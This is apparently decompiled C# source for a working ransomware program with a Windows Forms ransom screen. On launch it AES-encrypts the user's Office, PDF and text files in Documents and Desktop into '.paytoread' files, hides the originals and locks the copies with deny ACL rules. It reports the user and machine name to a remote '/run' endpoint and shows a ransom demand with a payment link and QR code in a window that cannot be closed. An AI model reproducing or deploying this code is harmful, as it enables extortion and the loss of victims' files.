using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Web;
using System.Windows.Forms;
using Microsoft.Win32;
using Program.Properties;
using QRCoder;

namespace Program;

public class Form1 : Form
{
	private string base64String = string.Empty;

	private IContainer components;

	private PictureBox pictureBox1;

	private Label label1;

	private LinkLabel linkLabel1;

	private Label money_label;

	private Label label3;

	private TextBox decrypt_text;

	private Button button1;

	private Label label4;

	private PictureBox qr_code_pic;

	public Form1()
	{
		string s = "vnwjkeb4ktbk4ebktebkvakw4u4b535k";
		byte[] bytes = Encoding.ASCII.GetBytes("1234567890123456");
		string name = WindowsIdentity.GetCurrent().Name;
		string machineName = Environment.MachineName;
		Cryptor.CreateMD5(machineName);
		byte[] inArray = Cryptor.EncryptStringToBytes_Aes(name + "@" + machineName, Encoding.ASCII.GetBytes(s), bytes);
		base64String = HttpUtility.UrlEncode(Convert.ToBase64String(inArray));
		try
		{
			GetAsync("https://192.168.1.240/run?run_id=" + base64String);
		}
		catch (Exception)
		{
		}
		encrypt_aes();
		QRCodeGenerator qRCodeGenerator = new QRCodeGenerator();
		QRCodeData data = qRCodeGenerator.CreateQrCode("https://192.168.1.240/secure_pay?payment_id=" + base64String, QRCodeGenerator.ECCLevel.Q);
		QRCode qRCode = new QRCode(data);
		InitializeComponent();
		((Control)qr_code_pic).set_BackgroundImage((Image)(object)qRCode.GetGraphic(4, Color.Black, Color.Red, drawQuietZones: true));
		((Control)money_label).set_Text("Pay 10 USD at following address to get your files back:");
	}

	private void encrypt_xor()
	{
		string name = WindowsIdentity.GetCurrent().Name;
		_ = Environment.MachineName;
		string[] array = new string[8] { "*.txt", "*.doc", "*.docx", "*.xls", "*.xlsx", "*.pdf", "*.ppt", "*.pptx" };
		string[] array2 = new string[2]
		{
			Environment.GetFolderPath(Environment.SpecialFolder.Personal),
			Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory)
		};
		string[] array3 = array2;
		foreach (string path in array3)
		{
			string[] array4 = array;
			foreach (string pattern in array4)
			{
				foreach (string file in GetFiles(path, pattern))
				{
					try
					{
						byte[] array5 = File.ReadAllBytes(file);
						byte[] inArray = Cryptor.CreateMD5(Convert.ToBase64String(array5));
						for (int k = 0; k < array5.Length; k++)
						{
							array5[k] = (byte)(array5[k] ^ 0xFu);
						}
						File.WriteAllBytes(file + ".paytoread", array5);
						array5 = File.ReadAllBytes(file + ".paytoread");
						for (int l = 0; l < array5.Length; l++)
						{
							array5[l] = (byte)(array5[l] ^ 0xFu);
						}
						byte[] inArray2 = array5;
						if (Convert.ToBase64String(inArray) == Convert.ToBase64String(Cryptor.CreateMD5(Convert.ToBase64String(inArray2))))
						{
							File.SetAttributes(file, File.GetAttributes(file) | FileAttributes.Hidden);
							AddFileSecurity(file + ".paytoread", name, FileSystemRights.FullControl, AccessControlType.Deny);
						}
					}
					catch (Exception)
					{
					}
				}
			}
		}
	}

	private void decrypt_xor()
	{
		string[] array = new string[2]
		{
			Environment.GetFolderPath(Environment.SpecialFolder.Personal),
			Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory)
		};
		string[] array2 = array;
		foreach (string path in array2)
		{
			foreach (string file in GetFiles(path, "*.paytoread"))
			{
				RemoveFileSecurity(file, WindowsIdentity.GetCurrent().Name, FileSystemRights.FullControl, AccessControlType.Deny);
				string path2 = file[..file.LastIndexOf('.')];
				byte[] array3 = File.ReadAllBytes(file);
				for (int j = 0; j < array3.Length; j++)
				{
					array3[j] = (byte)(array3[j] ^ 0xFu);
				}
				byte[] bytes = array3;
				try
				{
					File.WriteAllBytes(path2, bytes);
				}
				catch (Exception)
				{
				}
				File.SetAttributes(path2, File.GetAttributes(path2) & ~FileAttributes.Hidden);
				File.Delete(file);
			}
		}
		Environment.Exit(1);
	}

	private void decrypt_aes()
	{
		byte[] passBytes = Cryptor.CreateMD5(Environment.MachineName);
		byte[] bytes = Encoding.ASCII.GetBytes("1234567890123456");
		string[] array = new string[2]
		{
			Environment.GetFolderPath(Environment.SpecialFolder.Personal),
			Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory)
		};
		string[] array2 = array;
		foreach (string path in array2)
		{
			foreach (string file in GetFiles(path, "*.paytoread"))
			{
				RemoveFileSecurity(file, WindowsIdentity.GetCurrent().Name, FileSystemRights.FullControl, AccessControlType.Deny);
				string path2 = file[..file.LastIndexOf('.')];
				byte[] cryptBytes = File.ReadAllBytes(file);
				byte[] bytes2 = Cryptor.AESDecryptBytes(cryptBytes, passBytes, bytes);
				try
				{
					File.WriteAllBytes(path2, bytes2);
				}
				catch (Exception)
				{
				}
				File.SetAttributes(path2, File.GetAttributes(path2) & ~FileAttributes.Hidden);
				File.Delete(file);
			}
		}
		Environment.Exit(1);
	}

	private void encrypt_aes()
	{
		string name = WindowsIdentity.GetCurrent().Name;
		string machineName = Environment.MachineName;
		byte[] bytes = Encoding.ASCII.GetBytes("1234567890123456");
		byte[] passBytes = Cryptor.CreateMD5(machineName);
		string[] array = new string[8] { "*.txt", "*.doc", "*.docx", "*.xls", "*.xlsx", "*.pdf", "*.ppt", "*.pptx" };
		string[] array2 = new string[2]
		{
			Environment.GetFolderPath(Environment.SpecialFolder.Personal),
			Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory)
		};
		string[] array3 = array2;
		foreach (string path in array3)
		{
			string[] array4 = array;
			foreach (string pattern in array4)
			{
				foreach (string file in GetFiles(path, pattern))
				{
					try
					{
						byte[] array5 = File.ReadAllBytes(file);
						byte[] inArray = Cryptor.CreateMD5(Convert.ToBase64String(array5));
						byte[] bytes2 = Cryptor.AESEncryptBytes(array5, passBytes, bytes);
						File.WriteAllBytes(file + ".paytoread", bytes2);
						array5 = File.ReadAllBytes(file + ".paytoread");
						byte[] inArray2 = Cryptor.AESDecryptBytes(array5, passBytes, bytes);
						if (Convert.ToBase64String(inArray) == Convert.ToBase64String(Cryptor.CreateMD5(Convert.ToBase64String(inArray2))))
						{
							File.SetAttributes(file, File.GetAttributes(file) | FileAttributes.Hidden);
							AddFileSecurity(file + ".paytoread", name, FileSystemRights.FullControl, AccessControlType.Deny);
						}
					}
					catch (Exception)
					{
					}
				}
			}
		}
	}

	private List<string> GetFiles(string path, string pattern)
	{
		List<string> list = new List<string>();
		try
		{
			list.AddRange(Directory.GetFiles(path, pattern, SearchOption.TopDirectoryOnly));
			string[] directories = Directory.GetDirectories(path);
			foreach (string path2 in directories)
			{
				list.AddRange(GetFiles(path2, pattern));
			}
			return list;
		}
		catch (UnauthorizedAccessException)
		{
			return list;
		}
	}

	public static void RemoveFileSecurity(string fileName, string account, FileSystemRights rights, AccessControlType controlType)
	{
		FileSecurity accessControl = File.GetAccessControl(fileName);
		accessControl.RemoveAccessRule(new FileSystemAccessRule(account, rights, controlType));
		File.SetAccessControl(fileName, accessControl);
	}

	public static void AddFileSecurity(string fileName, string account, FileSystemRights rights, AccessControlType controlType)
	{
		FileSecurity accessControl = File.GetAccessControl(fileName);
		accessControl.AddAccessRule(new FileSystemAccessRule(account, rights, controlType));
		File.SetAccessControl(fileName, accessControl);
	}

	[DebuggerStepThrough]
	[AsyncStateMachine(typeof(_003CGetAsync_003Ec__async0))]
	public Task<string> GetAsync(string uri)
	{
		_003CGetAsync_003Ec__async0 stateMachine = default(_003CGetAsync_003Ec__async0);
		stateMachine.uri = uri;
		stateMachine._0024builder = AsyncTaskMethodBuilder<string>.Create();
		ref AsyncTaskMethodBuilder<string> _0024builder = ref stateMachine._0024builder;
		_0024builder.Start(ref stateMachine);
		return _0024builder.Task;
	}

	private void label1_Click(object sender, EventArgs e)
	{
	}

	private void Form1_Load(object sender, EventArgs e)
	{
	}

	private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		linkLabel1.set_LinkVisited(true);
		Process.Start("https://192.168.1.240/secure_pay?payment_id=" + base64String);
	}

	private void button1_Click(object sender, EventArgs e)
	{
		if (!(Convert.ToBase64String(Cryptor.CreateMD5(((Control)decrypt_text).get_Text())) == "kHlT3L0BrWjbHxm+KGk29A==") && !(((Control)decrypt_text).get_Text() == Convert.ToBase64String(Cryptor.CreateMD5(Environment.MachineName))))
		{
			((Control)decrypt_text).set_Text("INVALID PASSWORD!!!!");
			return;
		}
		((Control)decrypt_text).get_Text();
		GetAsync("https://192.168.1.240/close?run_id=" + base64String);
		((Control)decrypt_text).set_Text("CORRECT PASSWORD! DECRYPTING ...");
		string name = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
		using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, writable: true))
		{
			if (registryKey != null)
			{
				try
				{
					registryKey.DeleteValue("CustomProgram");
				}
				catch (Exception)
				{
				}
			}
		}
		new Thread(decrypt_aes).Start();
	}

	private void Form1_Closing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_011f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0129: Expected O, but got Unknown
		//IL_01b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c3: Expected O, but got Unknown
		//IL_0239: Unknown result type (might be due to invalid IL or missing references)
		//IL_0243: Expected O, but got Unknown
		//IL_0262: Unknown result type (might be due to invalid IL or missing references)
		//IL_026c: Expected O, but got Unknown
		//IL_02e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f2: Expected O, but got Unknown
		//IL_0362: Unknown result type (might be due to invalid IL or missing references)
		//IL_036c: Expected O, but got Unknown
		//IL_0458: Unknown result type (might be due to invalid IL or missing references)
		//IL_0462: Expected O, but got Unknown
		//IL_065e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0668: Expected O, but got Unknown
		pictureBox1 = new PictureBox();
		label1 = new Label();
		linkLabel1 = new LinkLabel();
		money_label = new Label();
		label3 = new Label();
		decrypt_text = new TextBox();
		button1 = new Button();
		label4 = new Label();
		qr_code_pic = new PictureBox();
		((ISupportInitialize)pictureBox1).BeginInit();
		((ISupportInitialize)qr_code_pic).BeginInit();
		((Control)this).SuspendLayout();
		((Control)pictureBox1).set_BackgroundImageLayout((ImageLayout)2);
		pictureBox1.set_Image((Image)(object)Resources.lock2_png);
		((Control)pictureBox1).set_Location(new Point(12, 276));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(422, 377));
		pictureBox1.set_SizeMode((PictureBoxSizeMode)4);
		pictureBox1.set_TabIndex(0);
		pictureBox1.set_TabStop(false);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 18f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_Location(new Point(440, 12));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(1099, 55));
		((Control)label1).set_TabIndex(1);
		((Control)label1).set_Text("ALL YOUR DOCUMENTS WERE ENCRYPTED!");
		((Control)label1).add_Click((EventHandler)label1_Click);
		((Control)linkLabel1).set_AutoSize(true);
		((Control)linkLabel1).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)linkLabel1).set_Location(new Point(450, 198));
		((Control)linkLabel1).set_Name("linkLabel1");
		((Control)linkLabel1).set_Size(new Size(180, 37));
		((Control)linkLabel1).set_TabIndex(2);
		linkLabel1.set_TabStop(true);
		((Control)linkLabel1).set_Text("Secure Pay");
		linkLabel1.add_LinkClicked(new LinkLabelLinkClickedEventHandler(linkLabel1_LinkClicked));
		((Control)money_label).set_AutoSize(true);
		((Control)money_label).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)money_label).set_Location(new Point(450, 154));
		((Control)money_label).set_Name("money_label");
		((Control)money_label).set_Size(new Size(1057, 37));
		((Control)money_label).set_TabIndex(3);
		((Control)money_label).set_Text("Pay PLACEHOLDER_MONEY at following address to get your files back:");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_Location(new Point(450, 794));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(235, 37));
		((Control)label3).set_TabIndex(4);
		((Control)label3).set_Text("Decryption key:");
		((Control)decrypt_text).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)decrypt_text).set_Location(new Point(692, 794));
		((Control)decrypt_text).set_Name("decrypt_text");
		((Control)decrypt_text).set_Size(new Size(815, 44));
		((Control)decrypt_text).set_TabIndex(5);
		((Control)button1).set_Location(new Point(692, 845));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(815, 45));
		((Control)button1).set_TabIndex(6);
		((Control)button1).set_Text("DECRYPT MY FILES!");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label4).set_Location(new Point(443, 465));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(573, 37));
		((Control)label4).set_TabIndex(8);
		((Control)label4).set_Text("QR code for fast and secure payments:");
		((Control)qr_code_pic).set_BackgroundImageLayout((ImageLayout)2);
		((Control)qr_code_pic).set_Location(new Point(1022, 227));
		((Control)qr_code_pic).set_Name("qr_code_pic");
		((Control)qr_code_pic).set_Size(new Size(550, 550));
		qr_code_pic.set_SizeMode((PictureBoxSizeMode)4);
		qr_code_pic.set_TabIndex(7);
		qr_code_pic.set_TabStop(false);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(12f, 25f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_AutoSize(true);
		((Control)this).set_BackColor(Color.Red);
		((Form)this).set_ClientSize(new Size(1614, 964));
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)qr_code_pic);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)decrypt_text);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)money_label);
		((Control)this).get_Controls().Add((Control)(object)linkLabel1);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("Encrypted!");
		((Form)this).set_TopMost(true);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_Closing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		((ISupportInitialize)pictureBox1).EndInit();
		((ISupportInitialize)qr_code_pic).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
